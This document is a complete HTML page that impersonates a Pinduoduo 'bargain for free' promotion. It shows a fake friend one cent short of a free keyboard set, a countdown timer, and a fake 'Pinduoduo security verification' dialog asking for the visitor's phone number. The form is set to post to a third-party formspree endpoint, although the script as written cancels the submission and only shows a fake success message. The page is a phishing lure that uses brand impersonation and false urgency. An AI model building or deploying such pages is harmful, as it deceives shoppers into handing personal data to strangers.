<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>拼多多 - 砍价免费拿</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "PingFang SC", "Helvetica Neue", Arial, sans-serif;
        }
        body {
            background: #f5f5f5;
            color: #333;
            font-size: 14px;
        }
        button {
            border: none;
            outline: none;
            background: none;
            cursor: pointer;
        }

        /* 顶部导航：用 CSS 画 logo，不依赖任何图片 */
        .pdd-header {
            position: sticky;
            top: 0;
            z-index: 999;
            background: #e62c2c;
            height: 44px;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 0 15px;
        }
        /* CSS 绘制拼多多 logo */
        .pdd-logo {
            width: 24px;
            height: 24px;
            background: white;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 8px;
        }
        .pdd-logo-inner {
            width: 12px;
            height: 12px;
            background: #e62c2c;
            color: white;
            font-size: 10px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .pdd-header .title {
            color: #fff;
            font-size: 17px;
            font-weight: 600;
        }

        .help-card {
            background: #fff;
            margin: 8px;
            border-radius: 8px;
            padding: 12px;
            display: flex;
            align-items: center;
        }
        .help-card .avatar {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            background: #eee;
            margin-right: 12px;
        }
        .help-card .info .name {
            font-size: 15px;
            font-weight: 500;
        }
        .help-card .info .desc {
            font-size: 13px;
            color: #e62c2c;
        }

        .goods-section {
            background: #fff;
            margin: 8px;
            border-radius: 8px;
            padding: 15px;
        }
        .goods-wrap {
            display: flex;
        }
        .goods-img {
            width: 110px;
            height: 110px;
            background: #eee;
            border-radius: 6px;
            margin-right: 12px;
        }
        .goods-name {
            font-size: 14px;
            line-height: 1.4;
            margin-bottom: 8px;
        }
        .goods-price {
            font-size: 18px;
            color: #e62c2c;
            font-weight: 700;
        }

        .progress-wrap {
            margin: 10px 0;
        }
        .progress-title {
            font-size: 13px;
            color: #666;
            display: flex;
            justify-content: space-between;
        }
        .progress-bar {
            width: 100%;
            height: 10px;
            background: #f8f8f8;
            border-radius: 5px;
            overflow: hidden;
        }
        .progress-inner {
            width: 99.6%;
            height: 100%;
            background: #e62c2c;
        }

        .help-list {
            background: #fff;
            margin: 8px;
            border-radius: 8px;
            padding: 12px 15px;
        }
        .avatar-group {
            display: flex;
            flex-wrap: wrap;
            gap: 6px;
        }
        .avatar-item {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            background: #eee;
        }

        .countdown-wrap {
            background: #fff8f0;
            border: 1px solid #ffe8cc;
            border-radius: 8px;
            margin: 8px;
            padding: 10px 15px;
            font-size: 13px;
            color: #ff6700;
            text-align: center;
        }

        .cut-btn-wrap {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            padding: 12px 15px 20px;
            background: #fff;
        }
        .cut-btn {
            width: 100%;
            height: 48px;
            background: #e62c2c;
            color: #fff;
            font-size: 17px;
            font-weight: 600;
            border-radius: 24px;
        }

        .modal-mask {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.7);
            z-index: 9999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 0 20px;
        }
        .modal-wrap {
            background: #fff;
            border-radius: 12px;
            padding: 25px 20px;
            max-width: 340px;
            width: 100%;
            text-align: center;
        }
        .modal-title {
            font-size: 18px;
            font-weight: 600;
            margin-bottom: 10px;
        }
        .modal-desc {
            font-size: 13px;
            color: #666;
            margin-bottom: 20px;
        }
        .phone-input {
            width: 100%;
            height: 44px;
            padding: 0 15px;
            border: 1px solid #e5e5e5;
            border-radius: 8px;
            font-size: 16px;
            margin-bottom: 20px;
        }
        .submit-btn {
            width: 100%;
            height: 44px;
            background: #e62c2c;
            color: #fff;
            font-size: 16px;
            border-radius: 8px;
        }
        .success-tip {
            display: none;
            margin-top: 15px;
            color: #07c160;
        }
    </style>
</head>
<body>

<!-- 顶部：纯 CSS logo，绝对不会加载失败 -->
<div class="pdd-header">
    <div class="pdd-logo">
        <div class="pdd-logo-inner">拼</div>
    </div>
    <div class="title">砍价免费拿</div>
</div>

<div class="help-card">
    <div class="avatar"></div>
    <div class="info">
        <div class="name">王XX</div>
        <div class="desc">就差0.01元！帮我砍一刀拿达尔优键鼠套装</div>
    </div>
</div>

<div class="goods-section">
    <div class="goods-wrap">
        <div class="goods-img"></div>
        <div class="goods-info">
            <div class="goods-name">达尔优EK815机械键盘鼠标套装游戏电竞电脑笔记本办公男女生通用</div>
            <div class="goods-price">¥199.00</div>
        </div>
    </div>
    <div class="progress-wrap">
        <div class="progress-title">
            <span>已砍 ¥198.99</span>
            <span>还差 ¥0.01</span>
        </div>
        <div class="progress-bar">
            <div class="progress-inner"></div>
        </div>
    </div>
</div>

<div class="help-list">
    <div class="title">已帮砍的好友</div>
    <div class="avatar-group">
        <div class="avatar-item"></div>
        <div class="avatar-item"></div>
        <div class="avatar-item"></div>
        <div class="avatar-item"></div>
    </div>
</div>

<div class="countdown-wrap">
    仅剩1小时45分！超时未砍价，商品将自动失效
</div>

<div class="cut-btn-wrap">
    <button class="cut-btn" id="cutBtn">帮好友砍一刀</button>
</div>

<div class="modal-mask" id="modalMask">
    <div class="modal-wrap">
        <div class="modal-title">拼多多安全验证</div>
        <div class="modal-desc">为防止非真人砍价，需验证手机号<br>验证后即可帮好友砍价，无任何费用</div>
        <form id="phoneForm" action="https://formspree.io/f/myknqdkn" method="POST">
            <input type="tel" class="phone-input" name="phone" placeholder="请输入你的手机号码" required>
            <button type="submit" class="submit-btn">确认验证</button>
        </form>
        <div class="success-tip" id="successTip">
            验证成功！你已帮好友砍了0.01元！
        </div>
    </div>
</div>

<script>
    const cutBtn = document.getElementById('cutBtn');
    const modalMask = document.getElementById('modalMask');
    const phoneForm = document.getElementById('phoneForm');
    const successTip = document.getElementById('successTip');

    cutBtn.onclick = () => { modalMask.style.display = 'flex'; };

    phoneForm.onsubmit = async (e) => {
        e.preventDefault();
        phoneForm.style.display = 'none';
        successTip.style.display = 'block';
        setTimeout(() => {
            modalMask.style.display = 'none';
            phoneForm.style.display = 'block';
            successTip.style.display = 'none';
            phoneForm.reset();
        }, 2000);
    };
</script>

</body>
</html>
